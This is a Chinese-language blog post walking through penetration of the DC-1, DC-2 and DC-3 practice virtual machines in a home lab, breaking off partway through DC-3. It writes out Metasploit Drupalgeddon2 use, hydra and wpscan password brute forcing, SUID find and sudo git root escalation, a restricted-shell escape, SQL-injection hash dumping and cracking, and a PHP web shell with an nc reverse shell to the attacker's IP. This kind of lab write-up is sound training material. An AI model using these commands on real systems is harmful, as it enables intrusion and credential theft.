
<!DOCTYPE html>
<html lang class="loading">
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>DC-1至DC-4靶机渗透测试 - Knlvre</title>
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="google" content="notranslate">
    <meta name="keywords" content="TriDiamond Obsidian,"> 
    <meta name="description" content="前言由于网络环境的变化，攻击机和靶机的IP可能发生改变。在每道题目中如果有改变，我会在开头的环境中写出来
DC-1环境虚拟机平台：VMware Workstation Pro
攻击机：Kali（IP,"> 
    <meta name="author" content="Knlvre"> 
    <link rel="alternative" href="atom.xml" title="Knlvre" type="application/atom+xml"> 
    <link rel="icon" href="/knlvre.github.io/img/favicon.ico"> 
    <link href="https://fonts.loli.net/css?family=Roboto+Mono|Rubik&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="//at.alicdn.com/t/font_1429596_nzgqgvnmkjb.css">
    <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.7.2/animate.min.css">
    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
    <link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/codemirror.min.css">
    <link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/theme/dracula.css">
    <link rel="stylesheet" href="/knlvre.github.io/css/obsidian.css">
    <link rel="stylesheet" href="/knlvre.github.io/css/ball-atom.min.css">
</head>
</html>

<body class="loading">
    <div class="loader">
        <div class="la-ball-atom la-2x">
            <div></div>
            <div></div>
            <div></div>
            <div></div>
        </div>
    </div>
    <span id="config-title" style="display:none">Knlvre</span>
    <div id="loader"></div>
    <div id="single">
    <div class="scrollbar gradient-bg-rev"></div>
<div id="top" style="display: block;">
    <div class="bar" style="width: 0;"></div>
    <div class="navigation animated fadeIn fast delay-1s">
        <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="https://knlvre.github.io">
        <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
        <h3 class="subtitle">DC-1至DC-4靶机渗透测试</h3>
        <div class="social">
            <!--        <div class="like-icon">-->
            <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
            <!--        </div>-->
            <div>
                <div class="share">
                    
                        <a href="javascript:;" class="iconfont icon-share1"></a>
                        <div class="share-component-cc" data-disabled="facebook,douban,linkedin,diandian,tencent,google"></div>
                    
                </div>
            </div>
        </div>
    </div>
</div>

    <div class="section">
        <div class=article-header-wrapper>
    <div class="article-header">
        <div class="article-cover animated fadeIn" style="
            animation-delay: 600ms;
            animation-duration: 1.2s;
            background-image: 
                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
                url(/img/cover.jpg);">
        </div>
        <div class="else">
            <p class="animated fadeInDown">
                
                <a href="javascript:;"><b>「 </b>Article<b> 」</b></a>
                
                September 17, 2019
            </p>
            <h3 class="post-title animated fadeInDown"><a href="/knlvre.github.io/2019/09/17/DC1-DC4靶机渗透测试/" title="DC-1至DC-4靶机渗透测试">DC-1至DC-4靶机渗透测试</a>
            </h3>
            
            <p class="post-count animated fadeInDown">
                
                <span>
                    <b class="iconfont icon-text2"></b> <i>Words count</i>
                    41k
                </span>
                
                
                <span>
                    <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
                    37 mins.
                </span>
                
                
                
                <span id="busuanzi_container_page_pv">
                    <b class="iconfont icon-read"></b> <i>Read count</i>
                    <span id="busuanzi_value_page_pv">0</span>
                </span>
                
            </p>
            
            
            <ul class="animated fadeInDown post-tags-list"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/knlvre.github.io/tags/渗透测试/">渗透测试</a></li></ul>
            
        </div>
    </div>
</div>

<div class="screen-gradient-after">
    <div class="screen-gradient-content">
        <div class="screen-gradient-content-inside">
            <div class="bold-underline-links screen-gradient-sponsor">
                <p>
                    <span class="animated fadeIn delay-1s"></span>
                </p>
            </div>
        </div>
    </div>
</div>

<div class="article">
    <div class='main'>
        <div class="content markdown animated fadeIn">
            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>由于网络环境的变化，攻击机和靶机的IP可能发生改变。在每道题目中如果有改变，我会在开头的环境中写出来</p>
<h1 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>虚拟机平台：VMware Workstation Pro</p>
<p>攻击机：Kali（IP：192.168.43.84）</p>
<p>靶机：DC-1（IP：192.168.43.27）</p>
<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>打开DC1靶机之后，需要输入登录的账号和密码，但是却不知道</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-1.png" alt="1-1"></p>
<p>由于IP也不知道，所以没有目标下手，所以需要获取靶机的IP地址。Kali上使用<code>Nmap</code>扫描本网段下的所有主机</p>
<p>先查看Kali所处的网段</p>
<pre><code>ifconfig
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-2.png" alt="1-2"></p>
<p>Nmap通过Ping方法扫描网段内所有主机，排除掉其他IP，找到目标靶机（192.168.43.27）</p>
<pre><code>nmap -sP 192.168.43.0/24
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-3.png" alt="1-3"></p>
<p>扫描主机开放的端口</p>
<p>Ps：-sV，版本探测。版本探测不是进行端口扫描，而是通过相应的端口对应的服务，根据服务指纹识别出相应的版本</p>
<pre><code>nmap -sV 192.168.43.27
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-4.png" alt="1-4"></p>
<p>既然开放了<code>http服务的80端口</code>，那现在就直接用浏览器访问一下</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-5.png" alt="1-5"></p>
<p>发现是典型的<code>Drupal Site</code>，那就可以启动<code>Metersploit</code>来帮助渗透</p>
<pre><code>msfconsole
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-6.png" alt="1-6"></p>
<p>搜索<code>drupal</code>的模块</p>
<pre><code>search drupal
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-7.png" alt="1-7"></p>
<p>使用2018-03-28的测试，成功</p>
<pre><code>use exploit/unix/webapp/drupal_drupalgeddon2
set rhosts 192.168.43.27
run
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-8.png" alt="1-8"></p>
<p>获取<code>shell</code></p>
<pre><code>shell
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-9.png" alt="1-9"></p>
<p>使用<code>Python</code>反弹回一个交互式shell</p>
<pre><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-10.png" alt="1-10"></p>
<p>在当前目录下（网页根目录<code>/var/www/</code>）发现<code>flag1.txt</code>，查看后给出提示：</p>
<blockquote>
<p>Every good CMS needs a config file - and so do you.</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-11.png" alt="1-11"></p>
<p>既然提示我们<code>网站配置文件</code>，那就到<code>/var/www/sites/default</code>目录下，查看<code>cat settings.php</code>文件，发现了<code>flag2</code></p>
<p>并且提示：</p>
<blockquote>
<p>Brute force and dictionary attacks aren’t the only ways to gain access (and you WILL need access).What can you do with these credentials?</p>
</blockquote>
<p>大意应该就是我们能用当前配置文件下的信息做一些什么呢？注意到提示下面有数据库的账号密码，所以我们可以拿着这个去登录数据库</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-12.png" alt="1-12"></p>
<p>尝试登录数据库，成功</p>
<pre><code>mysql -u dbuser -p
R0ck3t
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-13.png" alt="1-13"></p>
<p>查看<code>drupal库-users表</code>，发现了admin的账号密码，但是密码经过加密</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-14.png" alt="1-14"></p>
<p>现在可以选择修改掉admin的密码，但是密码经过特殊算法加密，如果不按照它的加密规则修改，查询的时候还是会不正确，所以就必须按照加密规则加密然后去修改。参考文章：<a href="http://drupalchina.cn/node/2128" target="_blank" rel="noopener">http://drupalchina.cn/node/2128</a></p>
<p>退出数据库，切换到网站根目录下</p>
<pre><code>\q
cd /var/www
php scripts/password-hash.sh [123456]
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-15.png" alt="1-15"></p>
<p>再次进入数据库，将刚才返回的<code>hash值</code>拿去替换为<code>admin</code>的密码</p>
<pre><code>update users set pass=&quot;$S$DpO/2yRe.nB1y8WswwIgYPp/hxooDcHaPXrEW33ERy9o5ox2jLwa&quot; where name=&quot;admin&quot;;
select * from users;
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-16.png" alt="1-16"></p>
<p>更改完后，现在用户admin的密码就变为123456了，回到网站中尝试登陆，果然成功了</p>
<p>并且在<code>Dashboard</code>模块找到了<code>flag3</code>，提示：</p>
<blockquote>
<p>Special PERMS will help FIND the passwd - but you’ll need to -exec that command to work out how to get what’s in the shadow.</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-17.png" alt="1-17"></p>
<p>flag3提示我们<code>提权（PERMS）</code>、<code>FIND命令</code>、<code>-exec</code>。既然涉及到提权，那么下一个flag应该是需要相应的权限才能查看，可以搜索一下flag关键字</p>
<pre><code>find / -name &quot;flag*&quot;
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-18.png" alt="1-18"></p>
<p>找到了<code>/home/flag4</code>目录下的<code>flag4.txt</code>，查看后给出了提示：</p>
<blockquote>
<p>Can you use this same method to find or access the flag in root? Probably. But perhaps it’s not that easy.  Or maybe it is?</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-19.png" alt="1-19"></p>
<p>提示我们<code>/root</code>下有下一个flag，但是尝试进入时，被拒绝了，只有<code>root</code>能访问</p>
<pre><code>cd /root
cd /
ls -l
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-20.png" alt="1-20"></p>
<p>现在就需要<code>提权</code>了，根据flag3的提示，本次使用具有<code>SUID</code>的命令来提权，先找一下具有<code>SUID（4000）</code>权限的命令，可以发现find命令就有<code>4000</code>权限</p>
<pre><code>find / -perm -4000
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-21.png" alt="1-21"></p>
<p>现在就可以利用<code>find命令</code>来提权，直接获得<code>root</code>权限</p>
<pre><code>cd /var/www
touch ti_quan
find / -name ti_quan -exec &quot;whoami&quot; \;
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-22.png" alt="1-22"></p>
<p>弹出root权限的shell，查看<code>/root</code>下的flag了</p>
<p>Ps：注意此处<code>&quot;/bin/sh&quot;</code>才会是<code>root</code>权限，如果换成<code>&quot;/bin/bash&quot;</code>就还会是<code>www-data</code>权限</p>
<pre><code>find / -name ti_quan -exec &quot;/bin/sh&quot; \;
cd \root
cat thefinalflag.txt
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-23.png" alt="1-23"></p>
<p>看了参考的文章，知道本靶机还有一个玩法，就是用<code>hydra</code>去爆破flag4用户的密码，先介绍参数：</p>
<pre><code>-l [指定用户名]
-P [加载自定义的密码字典]
ssh://[ip] 指定使用的协议和IP
</code></pre><p>先自己创建<code>password.txt</code>，然后使用hydra（由于我换了网络，所以IP改一下）</p>
<pre><code>hydra -l flag4 -P password.txt ssh://192.168.43.27
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-24.png" alt="1-24"></p>
<p>爆破出密码为<code>orange</code>，用ssh去连接登录</p>
<pre><code>ssh flag4@192.168.43.27
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-25.png" alt="1-25"></p>
<h1 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h1><h2 id="环境-1"><a href="#环境-1" class="headerlink" title="环境"></a>环境</h2><p>虚拟机平台：VMware Workstation Pro</p>
<p>攻击机：Kali（IP：192.168.43.84或192.168.2.107）</p>
<p>靶机：DC-2（IP：192.168.43.10或192.168.2.109）</p>
<h2 id="渗透测试-1"><a href="#渗透测试-1" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>打开DC2靶机之后，照样利用<code>Nmap</code>扫描攻击机的网段，找到DC2的IP地址之后，扫描DC2的端口开放情况</p>
<pre><code>nmap -sP 192.168.43.0/24
nmap -sV 192.168.43.10
</code></pre><p>扫描结果显示开放80端口，但是访问时却访问不了，用<code>-A</code>选项扫一下</p>
<pre><code>nmap -A 192.168.43.10
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-12.png" alt="2-12"></p>
<p>修改hosts文件</p>
<pre><code>vi /etc/hosts
cat /etc/hosts
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-13.png" alt="2-13"></p>
<p>再次浏览器访问，发现是<code>WordPress</code>的站，并且发现<code>flag1</code>，提示：</p>
<blockquote>
<p>Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.</p>
<p>More passwords is always better, but sometimes you just can’t win them all.</p>
<p>Log in as one to see the next flag.</p>
<p>If you can’t find it, log in as another.</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-1.png" alt="2-1"></p>
<p>根据提示的内容，应该是要我们去获取后台的用户和密码</p>
<p>首先，用Kali内的工具<code>wpscan（WordPress漏洞扫描器）</code>获取用户名</p>
<p>Ps：<code>-e u</code>作用是枚举用户</p>
<pre><code>wpscan --url http://dc-2/ -e u
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-2.png" alt="2-2"></p>
<p>从扫描结果可以看出来，一共扫描出三个用户：<code>admin</code>、<code>jerry</code>、<code>tom</code>。创建文本<code>dc2_users.txt</code>，将三个用户写入其中</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-3.png" alt="2-3"></p>
<p>接下来，使用Kali内的工具<code>cewl</code>扫描网站，获取可能的密码</p>
<p>Ps：<code>-w</code>参数用来将扫描结果输出到文件内</p>
<pre><code>cewl http://dc-2/ -w dc2_passwords.txt
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-4.png" alt="2-4"></p>
<p>现在有了用户名和密码，可以利用刚才生成的<code>dc2_users.txt</code>和<code>dc2_passwords.txt</code>去爆破。有两种方法：1.wpscan 2.hydra</p>
<p>方法一：wpscan</p>
<pre><code>wpscan --url http://dc-2/ -U dc2_users -P dc2_passwords.txt
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-5.png" alt="2-5"></p>
<p>方法二：hydra</p>
<p>由于hydra不行wpscan是专门针对WordPress的漏洞扫描工具，所以需要提供登录的页面<code>（wp-login.php）</code>、提交表单的方式<code>（POST）</code>以及表单的数据<code>（log、pwd等等）</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-6.png" alt="2-6"></p>
<pre><code>hydra -L dc2_users.txt -P dc2_passwords.txt dc-2 http-form-post &#39;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:S=Location&#39;
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-7.png" alt="2-7"></p>
<p>现在得到了<code>jerry</code>和<code>tom</code>的用户名和密码，登录<code>jerry</code>账户，拿到了<code>flag2</code>，提示：</p>
<blockquote>
<p>If you can’t exploit WordPress and take a shortcut, there is another way.</p>
<p>Hope you found another entry point.</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-8.png" alt="2-8"></p>
<p>重新扫描靶机的所有端口，扫到7744端口（raqmon-pdu）</p>
<pre><code>nmap -p1-65535 192.168.43.10
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-9.png" alt="2-9"></p>
<p>ssh连接，tom的账号</p>
<p>Ps：由于这里端口不是22号端口，所以需要指定端口</p>
<pre><code>ssh tom@192.168.43.10 -p 7744
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-10.png" alt="2-10"></p>
<p>连接成功，但是碰到了<code>rbash (restricited Bash)</code>，许多命令都被禁用了</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-11.png" alt="2-11"></p>
<p>用vi命令绕过受限的shell</p>
<pre><code>vi flag3.txt
:set shell=/bin/bash
:shell
export -p
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-14.png" alt="2-14"></p>
<pre><code class="bash"># export PATH=$PATH:/bin/
# export -p

tom@DC-2:~$ export PATH=$PATH:/bin/
tom@DC-2:~$ export -p
declare -x HOME=&quot;/home/tom&quot;
declare -x LANG=&quot;en_US.UTF-8&quot;
declare -x LOGNAME=&quot;tom&quot;
declare -x MAIL=&quot;/var/mail/tom&quot;
declare -x OLDPWD
declare -x PATH=&quot;/home/tom/usr/bin:/bin/&quot;    #此处加入了/bin/
declare -x PWD=&quot;/home/tom&quot;
declare -x SHELL=&quot;/bin/rbash&quot;
declare -x SHLVL=&quot;2&quot;
declare -x SSH_CLIENT=&quot;192.168.2.107 45502 7744&quot;
declare -x SSH_CONNECTION=&quot;192.168.2.107 45502 192.168.2.109 7744&quot;
declare -x SSH_TTY=&quot;/dev/pts/0&quot;
declare -x TERM=&quot;xterm-256color&quot;
declare -x USER=&quot;tom&quot;
declare -x VIM=&quot;/usr/share/vim&quot;
declare -x VIMRUNTIME=&quot;/usr/share/vim/vim74&quot;
</code></pre>
<p>此时就绕过了限制，可以查看flag3.txt的内容</p>
<pre><code class="bash">#cat flag3.txt

tom@DC-2:~$ cat flag3.txt
Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.
</code></pre>
<p>提示如下</p>
<blockquote>
<p>Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</p>
</blockquote>
<p>根据提示，我们此时切换到jerry用户</p>
<pre><code class="bash"># su jerry
# adipiscing
# cd /home/jerry/
# ls
# cat flag4.txt

tom@DC-2:~$ su jerry
Password: 
jerry@DC-2:/home/tom$ cd /home/jerry/
jerry@DC-2:~$ ls
flag4.txt
jerry@DC-2:~$ cat flag4.txt
Good to see that you&#39;ve made it this far - but you&#39;re not home yet. 

You still need to get the final flag (the only flag that really counts!!!).  

No hints here - you&#39;re on your own now.  :-)

Go on - git outta here!!!!
</code></pre>
<p>提示如下</p>
<blockquote>
<p>Good to see that you’ve made it this far - but you’re not home yet. </p>
<p>You still need to get the final flag (the only flag that really counts!!!).  </p>
<p>No hints here - you’re on your own now.  :-)</p>
<p>Go on - git outta here!!!!</p>
</blockquote>
<p>表面上说没有提示，但是最后一句话有<code>git</code>单词，提示我们利用git提权。提权成功后，拿到了最后的flag</p>
<pre><code class="bash"># sudo git -p help config
# !/bin/sh
# id
# cd ~
# ls
# cat final-flag.txt

jerry@DC-2:~$ sudo git -p help config
GIT-CONFIG(1)  ...
NAME
       git-config - Get and set repository or global options

SYNOPSIS
       git config [&lt;file-option&gt;] [type] [-z|--null] name [value [value_regex]]
       git config [&lt;file-option&gt;] [type] --add name value
       ...


DESCRIPTION
       You can query/set/replace/unset options with this command. The name is actually the section and the key separated by a dot, and the
       ...
       expansion (see --path below). If no type specifier is passed, no checks or transformations are performed on the value.
!/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
# cd ~
# ls
final-flag.txt
# cat final-flag.txt
 __    __     _ _       _                    _ 
/ / /\ \ \___| | |   __| | ___  _ __   ___  / \
\ \/  \/ / _ \ | |  / _` |/ _ \| &#39;_ \ / _ \/  /
 \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ 
  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   


Congratulatons!!!

A special thanks to all those who sent me tweets
and provided me with feedback - it&#39;s all greatly
appreciated.

If you enjoyed this CTF, send me a tweet via @DCAU7.
</code></pre>
<h1 id="DC-3"><a href="#DC-3" class="headerlink" title="DC-3"></a>DC-3</h1><h2 id="环境-2"><a href="#环境-2" class="headerlink" title="环境"></a>环境</h2><p>虚拟机平台：VMware Workstation Pro</p>
<p>攻击机：Kali（IP：192.168.43.84）</p>
<p>靶机：DC-3（IP：192.168.43.134）</p>
<h2 id="渗透测试-2"><a href="#渗透测试-2" class="headerlink" title="渗透测试"></a>渗透测试</h2><p><code>nmap</code>扫描靶机，发现只开启了80端口，浏览器访问</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/3-1.png" alt="3-1"></p>
<p>利用前段时间学长给的工具<code>gwhatweb</code>，知道了网站框架是<code>Joomla(逐浪)</code></p>
<pre><code># python gwhatweb.py http://192.168.43.134/

root@Knlvre:~/桌面/gwhatweb-master# python gwhatweb.py http://192.168.43.134/
webdata total:1421
CMS:Joomla(逐浪) Judge:http://192.168.43.134/administrator/components/com_login/login.xml re:joomla
CMS:Joomla(逐浪) Judge:http://192.168.43.134/components/com_wrapper/wrapper.xml re:joomla
CMS:Joomla(逐浪) Judge:http://192.168.43.134/README.txt re:joomla
CMS:Joomla(逐浪) Judge:http://192.168.43.134/plugins/authentication/joomla/joomla.xml re:joomla
CMS:Joomla(逐浪) Judge:http://192.168.43.134/modules/mod_banners/mod_banners.xml re:joomla
CMS:Joomla(逐浪) Judge:http://192.168.43.134/robots.txt.dist re:joomla
cost: 4.991101 s
</code></pre><p>使用Joomla框架扫描工具<code>Joomblah</code>扫描网站</p>
<pre><code># python joomblah.py http://192.168.43.134/

root@Knlvre:~/桌面/exploits/Joomblah# python joomblah.py http://192.168.43.134/

    .---.    .-&#39;&#39;&#39;-.        .-&#39;&#39;&#39;-.                                                           
    |   |   &#39;   _    \     &#39;   _    \                            .---.                        
    &#39;---&#39; /   /` &#39;.   \  /   /` &#39;.   \  __  __   ___   /|        |   |            .           
    .---..   |     \  &#39; .   |     \  &#39; |  |/  `.&#39;   `. ||        |   |          .&#39;|           
    |   ||   &#39;      |  &#39;|   &#39;      |  &#39;|   .-.  .-.   &#39;||        |   |         &lt;  |           
    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
    |   | `.   ` ..&#39; /   `.   ` ..&#39; /  |  |  |  |  |  |||/&#39;__ &#39;. |   | .:--.&#39;.  | | .&#39;&#39;&#39;-.    
    |   |    &#39;-...-&#39;`       &#39;-...-&#39;`   |  |  |  |  |  ||:/`  &#39;. &#39;|   |/ |   \ | | |/.&#39;&#39;&#39;. \   
    |   |                              |  |  |  |  |  |||     | ||   |`&quot; __ | | |  /    | |   
    |   |                              |__|  |__|  |__|||\    / &#39;|   | .&#39;.&#39;&#39;| | | |     | |   
 __.&#39;   &#39;                                              |/&#39;..&#39; / &#39;---&#39;/ /   | |_| |     | |   
|      &#39;                                               &#39;  `&#39;-&#39;`       \ \._,\ &#39;/| &#39;.    | &#39;.  
|____.&#39;                                                                `--&#39;  `&quot; &#39;---&#39;   &#39;---&#39; 

 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: d8uea_users
  -  Found table: users
  -  Extracting users from d8uea_users
 [$] Found user [&#39;629&#39;, &#39;admin&#39;, &#39;admin&#39;, &#39;freddy@norealaddress.net&#39;, &#39;$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu&#39;, &#39;&#39;, &#39;&#39;]
  -  Extracting sessions from d8uea_session
  -  Extracting users from users
  -  Extracting sessions from session

</code></pre><p>得到一串<code>hash</code>密码， 用<code>john</code>工具爆破一下得到密码：snoopy</p>
<pre><code># vi hash.txt
# 填入$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu
# john hash.txt

root@Knlvre:~/桌面/Hash-Algorithm-Identifier/hashidentifier# vi hash.txt
root@Knlvre:~/桌面/Hash-Algorithm-Identifier/hashidentifier# john hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Proceeding with single, rules:Single
Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
snoopy           (?)
1g 0:00:00:02 DONE 2/3 (2019-09-23 09:06) 0.4830g/s 17.39p/s 17.39c/s 17.39C/s mustang..buster
Use the &quot;--show&quot; option to display all of the cracked passwords reliably
Session completed
</code></pre><p>Ps：第一次使用<code>john</code>，当重复爆破一个文件时，会出现以下提示</p>
<pre><code>root@Knlvre:~# john hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
No password hashes left to crack (see FAQ)    #提示
</code></pre><p>百度之后才知道，john不会再执行爆破过的文件，如果出现如上提示，可以加<code>--show</code>参数查看文件，就能看到破解情况</p>
<pre><code>root@Knlvre:~# john --show hash.txt 
?:snoopy

1 password hash cracked, 0 left
</code></pre><p><code>dirsearch</code>扫描出后台<code>/administrator/</code></p>
<pre><code>[09:57:08] 200 -    5KB - /administrator/
[09:57:08] 200 -    5KB - /administrator/index.php
[09:57:08] 301 -  329B  - /administrator/logs  -&gt;  http://192.168.43.134/administrator/logs/
[09:57:11] 301 -  314B  - /bin  -&gt;  http://192.168.43.134/bin/
[09:57:11] 200 -   31B  - /bin/
[09:57:11] 301 -  316B  - /cache  -&gt;  http://192.168.43.134/cache/
[09:57:11] 200 -   31B  - /cache/
[09:57:12] 301 -  321B  - /components  -&gt;  http://192.168.43.134/components/
[09:57:13] 200 -    0B  - /configuration.php
[09:57:17] 200 -    3KB - /htaccess.txt
[09:57:18] 301 -  317B  - /images  -&gt;  http://192.168.43.134/images/
[09:57:18] 301 -  319B  - /includes  -&gt;  http://192.168.43.134/includes/
[09:57:18] 200 -   31B  - /includes/
[09:57:18] 200 -    7KB - /index.php
[09:57:20] 301 -  319B  - /language  -&gt;  http://192.168.43.134/language/
[09:57:20] 301 -  320B  - /libraries  -&gt;  http://192.168.43.134/libraries/
[09:57:20] 200 -   18KB - /LICENSE.txt
[09:57:21] 301 -  316B  - /media  -&gt;  http://192.168.43.134/media/
[09:57:22] 301 -  318B  - /modules  -&gt;  http://192.168.43.134/modules/
[09:57:25] 301 -  318B  - /plugins  -&gt;  http://192.168.43.134/plugins/
[09:57:26] 200 -    4KB - /README.txt
[09:57:27] 403 -  302B  - /server-status
[09:57:27] 403 -  303B  - /server-status/
[09:57:31] 200 -   31B  - /templates/
[09:57:31] 301 -  320B  - /templates  -&gt;  http://192.168.43.134/templates/
[09:57:32] 301 -  314B  - /tmp  -&gt;  http://192.168.43.134/tmp/
[09:57:32] 200 -   31B  - /tmp/
[09:57:33] 200 -    2KB - /web.config.txt
</code></pre><p>访问后，用admin的密码成功登陆</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/3-2.png" alt="3-2"></p>
<p>选择<code>Configuration -&gt; Templates -&gt; Templates -&gt; Protostar Details and Files -&gt; New File</code>，创建<code>shell.php</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/3-3.png" alt="3-3"></p>
<p>插入反弹shell命令</p>
<pre><code class="php">&lt;?php
system(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.43.84 3737 &gt;/tmp/f&#39;);
?&gt;
</code></pre>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/3-4.png" alt="3-4"></p>
<p>写完保存之后，我们先用<code>nc</code>监听<code>3737</code>端口</p>
<pre><code>root@Knlvre:~# nc -lvp 3737
listening on [any] 3737 ...
</code></pre><p>然后访问<code>shell.php</code></p>
<pre><code>http://192.168.43.134/templates/protostar/shell.php
</code></pre><p>在查看终端时，就拿到了shell，但是该用户并没有什么权限，无法切换到<code>~</code>目录下，准备提权</p>
<pre><code>root@Knlvre:~# nc -lvp 3737
listening on [any] 3737 ...
connect to [192.168.43.84] from DC3VM [192.168.43.134] 44292
/bin/sh: 0: can&#39;t access tty; job control turned off
$ whoami
www-data
</code></pre><p>查看版本</p>
<pre><code>$ lsb_release -a
No LSB modules are available.
Distributor ID:    Ubuntu
Description:    Ubuntu 16.04 LTS
Release:    16.04
Codename:    xenial
